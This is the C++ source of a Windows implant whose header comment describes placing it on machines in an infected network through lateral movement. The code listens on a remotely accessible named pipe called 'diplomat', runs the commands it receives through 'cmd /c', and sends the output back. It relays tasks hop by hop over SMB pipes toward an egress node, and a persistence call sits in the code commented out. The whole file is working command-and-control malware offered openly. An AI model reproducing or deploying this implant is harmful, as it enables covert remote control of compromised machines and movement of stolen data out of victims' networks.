/**************************************
 * This exe is placed on machines in
 * an infected network through lateral
 * movement. These nodes will communicate
 * with each other via SMB and data
 * will escape the network through
 * the http egress node
 * ***********************************/


#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <string>

#include "include/json_struct.h"
#include "include/persist.h"
#include "include/investigate.h"

#define BUFSIZE 2048

struct Task{
    std::string Path;
    std::string Command;

    JS_OBJ(Path, Command);
};

struct TaskOutput{
    std::string Hostname;
    std::string Command;
    std::string Output;

    JS_OBJ(Hostname, Command, Output);
};

int _tmain(int argc, _TCHAR *argv[]){
    //PersistMe();

    // Server loop
    for(;;){
        // Create server instance
        HANDLE hServer = CreateNamedPipeW(
            L"\\\\.\\pipe\\diplomat",
            (PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE),
            (PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_ACCEPT_REMOTE_CLIENTS | PIPE_WAIT),
            1,
            BUFSIZE,
            BUFSIZE,
            0,
            NULL
        );
        if(hServer == INVALID_HANDLE_VALUE){
            printf("Server creation failure.\n");
        }else{
            printf("Server created successfully.\n");
        }

        // Await client connection
        BOOL bConnected = ConnectNamedPipe(hServer, NULL);

        if(bConnected){
            printf("Client connected.\n");

            char* pchRequest = (char*)malloc(BUFSIZE*sizeof(char));
            char* pchReply = (char*)malloc(BUFSIZE*sizeof(char));
            DWORD cbBytesRead = 0, cbReplyBytes = 0, cbWritten = 0; 
            BOOL fSuccess = FALSE;
            
            // Read messages
            while(1){
                fSuccess = ReadFile( 
                    hServer,
                    pchRequest,
                    BUFSIZE*sizeof(char),
                    &cbBytesRead,
                    NULL
                );

                if (!fSuccess || cbBytesRead == 0){   
                    if (GetLastError() == ERROR_BROKEN_PIPE){
                        printf("Client disconnected.\n"); 
                    }else{
                        printf("ReadFile failed, GLE=%d.\n", GetLastError()); 
                    }
                    break;
                }

                // Process request
                // Create struct from request
                JS::ParseContext context(pchRequest);
                Task tr;
                if (context.parseTo(tr) != JS::Error::NoError)
                {
                    std::string errorStr = context.makeErrorString();
                    fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
                    return -1;
                }
                // Print struct contents for error checking
                printf("Path: %s\n", tr.Path.c_str());
                printf("Tasks: %s\n", tr.Command.c_str());

                // Check path contents to see what the intended destination is
                std::string hostname = ComputerName();
                if(tr.Path.compare(hostname) == 0){
                    // Message is intended for this agent
                    // Complete tasks specified in json, return result to connected client

                    // Construct command string
                    std::string cmd = "cmd /c " + tr.Command;
                    printf("cmd: %s\n", cmd);

                    // Declare handles for StdOut
                    HANDLE hStdOutRead, hStdOutWrite;
                    STARTUPINFOA si;
                    PROCESS_INFORMATION pi;
                    // Prevent dead squirrels 
                    ZeroMemory(&pi, sizeof(pi));
                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);

                    
                    SECURITY_ATTRIBUTES sa;
                    sa.nLength = sizeof(sa);
                    sa.lpSecurityDescriptor = NULL;
                    sa.bInheritHandle = TRUE;

                    BOOL success = CreatePipe(
                        &hStdOutRead,
                        &hStdOutWrite,
                        &sa,
                        0
                    );
                    if(!success)
                        printf("CPipe GLE=%x\n", GetLastError);

                    success = SetHandleInformation(
                        hStdOutRead,
                        HANDLE_FLAG_INHERIT,
                        0
                    );
                    if(!success)
                        printf("SHI GLE=%x\n", GetLastError);
                    

                    si.hStdInput = NULL;
                    si.hStdError = hStdOutWrite;
                    si.hStdOutput = hStdOutWrite;
                    si.dwFlags = STARTF_USESTDHANDLES;

                    // Create the child Processes and wait for it to terminate!
                    success = CreateProcessA(
                        NULL,
                        const_cast<char *>(cmd.c_str()),
                        NULL,
                        NULL,
                        TRUE,
                        0,
                        NULL,
                        NULL,
                        &si,
                        &pi
                    ); 
                    if(!success)
                        printf("CProcess GLE=%x\n", GetLastError);
                    
                    WaitForSingleObject( pi.hProcess, INFINITE );
                    
                    char* buffer = (char*)malloc(1024);
                    DWORD bytesAvail;
                    success = PeekNamedPipe(
                        hStdOutRead, 
                        NULL,
                        0,
                        NULL,
                        &bytesAvail,
                        NULL
                    );
                    if(success && bytesAvail > 0){
                        
                        DWORD bytesRead;
                        success = ReadFile(
                            hStdOutRead,
                            buffer,
                            1024-1,
                            &bytesRead,
                            NULL
                        );
                        if(success){
                            buffer[bytesRead] = '\0';
                        }
                    }

                    CloseHandle( pi.hProcess );
                    CloseHandle( pi.hThread );  
                    CloseHandle( hStdOutRead );
                    CloseHandle( hStdOutWrite );

                    // Construct json struct and serialize it
                    TaskOutput out;
                    out.Hostname = ComputerName();
                    out.Command = tr.Command;
                    out.Output = std::string(buffer);
                    std::string json = JS::serializeStruct(out);

                    // Write json to hServer
                    fSuccess = WriteFile( 
                        hServer,
                        json.c_str(),
                        json.size(),
                        &cbWritten,
                        NULL
                    );
                    if (!fSuccess) 
                    {
                        printf("WriteFile to pipe failed. GLE=%d\n", GetLastError()); 
                        return -1;
                    }
                    printf("Response written to server pipe.\n");

                    // Make response readable, then cleanup
                    FlushFileBuffers(hServer); 
                    DisconnectNamedPipe(hServer); 
                    CloseHandle(hServer);
                    free(buffer);
                }else{
                    // Message is intended for another agent
                    // Forward json request to next agent
                    // Await potential response (THIS SHOULD PROBABLY BE ASYNC)

                    // Remove current hostname from path
                    int index = tr.Path.find(',');
                    tr.Path = tr.Path.substr(index+1);
                    // Get name of next host in path
                    index = tr.Path.find(',');
                    std::string nextHostname;
                    if(index == -1){
                        nextHostname == tr.Path;
                    }else{
                        nextHostname = tr.Path.substr(0, index);
                    }
                    // Construct filepath for pipe of next agent
                    std::string agentPath = "\\\\" + nextHostname + "\\pipe\\diplomat";
                    printf("%s\n", agentPath);

                    // Attempt connection to agent's server pipe
                    HANDLE hPipe = INVALID_HANDLE_VALUE;
                    while(1){ 
                        hPipe = CreateFileA( 
                            agentPath.c_str(),
                            GENERIC_READ | GENERIC_WRITE, 
                            0,
                            NULL,
                            OPEN_EXISTING,
                            0,
                            NULL
                        );
                    
                        if (hPipe != INVALID_HANDLE_VALUE) 
                            break; 
                    
                        if (GetLastError() != ERROR_PIPE_BUSY) {
                            printf("Could not open pipe. GLE=%d\n", GetLastError()); 
                            return -1;
                        }
                    
                        // All pipe instances are busy, so wait for 20 seconds. 
                        if (!WaitNamedPipeA(agentPath.c_str(), 20000)){ 
                            printf("Could not open pipe: 20 second wait timed out."); 
                            return -1;
                        } 

                    }
                    
                    // Pipe is connected
                    // Change to message type pipe
                    DWORD dwMode = PIPE_READMODE_MESSAGE; 
                    fSuccess = SetNamedPipeHandleState( 
                        hPipe,
                        &dwMode,
                        NULL,
                        NULL
                    );
                    if ( ! fSuccess) 
                    {
                        printf("SetNamedPipeHandleState failed. GLE=%d\n", GetLastError()); 
                        return -1;
                    }
                    
                    // Send message to agent's pipe
                    // Put the altered struct back into json format
                    std::string json = JS::serializeStruct(tr);
                    // Write json to pipe
                    fSuccess = WriteFile( 
                        hPipe,
                        json.c_str(),
                        json.size(),
                        &cbWritten,
                        NULL
                    );
                    if (!fSuccess) 
                    {
                        printf("WriteFile to pipe failed. GLE=%d\n", GetLastError()); 
                        return -1;
                    }
                    printf("Message sent to server.\n");

                    // Wait for the request to propogate through the network
                    // Once the response chain finally reaches back to this node,
                    // Return reponse to connected client
                    char chResponse[BUFSIZE];
                    DWORD cbRead;
                    do{ 
                        // Read from the pipe. 
                        fSuccess = ReadFile( 
                            hPipe, 
                            chResponse,
                            BUFSIZE*sizeof(char),
                            &cbRead,
                            NULL
                        );
                        if (!fSuccess && GetLastError() != ERROR_MORE_DATA)
                            break; 
                    
                        printf("Response: \"%s\"\n", chResponse);
                        // Write reponse to this agent's pipe
                        fSuccess = WriteFile( 
                            hServer,
                            chResponse,
                            (lstrlenA(chResponse)+1)*sizeof(char),
                            &cbWritten,
                            NULL
                        );
                        if (!fSuccess || cbReplyBytes != cbWritten){   
                            printf("WriteFile failed, GLE=%d.\n", GetLastError()); 
                            break;
                        }
                    }while(!fSuccess);  // Conditional based on ERROR_MORE_DATA 

                    if (!fSuccess){
                        printf("ReadFile from next agent\'s pipe failed. GLE=%d\n", GetLastError());
                        return -1;
                    }

                    FlushFileBuffers(hServer); 
                    DisconnectNamedPipe(hServer); 
                    CloseHandle(hPipe);
                    CloseHandle(hServer); 
                }
            }
        }

    }
}